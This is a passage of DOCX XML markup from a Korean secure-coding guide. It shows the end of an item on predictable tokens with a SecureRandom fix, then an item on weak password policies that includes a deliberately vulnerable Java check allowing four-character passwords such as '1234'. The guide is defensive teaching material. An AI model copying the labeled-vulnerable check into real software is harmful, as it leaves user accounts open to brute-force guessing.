                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>타인의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>접근하거나</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> CSRF </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>토큰을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예측해</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>우회할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] SecureRandom </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>SecureRandom sr = new SecureRandom();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>byte[] tokenBytes = new byte[32];</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>sr.nextBytes(tokenBytes);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String token = Base64.getEncoder().encodeToString(tokenBytes);</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  9. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>취약한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>비밀번호</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>허용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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호는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영문자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>숫자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>특수문자를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혼합하고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최소</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> 8</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자리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이상으로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강제한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호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복잡도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정책을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서버에서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검증한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>길이만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>확인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>복잡도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없음</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>if (password.length() &gt;= 4) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">    // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>설정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>허용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> → "1234" </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>같은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>단순</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>최소</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> 4</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자리만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>강제할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>경우</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> 1234, 0000 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>같은</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>단순</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>허용됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자동화</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>툴로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
